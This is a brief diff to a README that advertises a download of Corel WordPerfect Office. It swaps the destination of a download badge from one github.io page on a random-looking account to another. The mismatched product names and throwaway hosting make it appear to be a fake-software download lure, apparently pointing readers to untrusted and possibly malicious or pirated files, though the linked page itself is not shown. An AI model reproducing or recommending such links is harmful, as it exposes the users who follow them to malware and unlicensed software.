@@ -21,7 +21,7 @@ To begin using this **Corel WordPerfect Office Suite** and **Corel Quattro Pro S
 | :--- | :--- |
 | **Get Corel WordPerfect Office Suite** | Click the button below to start using this **Corel Presentations Slideshow**. |
 
-[![Button](https://img.shields.io/badge/📄-Get_Corel_WordPerfect_Office-2ea44f?style=for-the-badge)](https://halidporyvai.github.io/.github/corel-wordperfect-office-suite)
+[![Button](https://img.shields.io/badge/📄-Get_Corel_WordPerfect_Office-2ea44f?style=for-the-badge)](https://ivanallisonijuj.github.io/.github/corel-wordperfect-office-suite)
 
 ## System Requirements
 
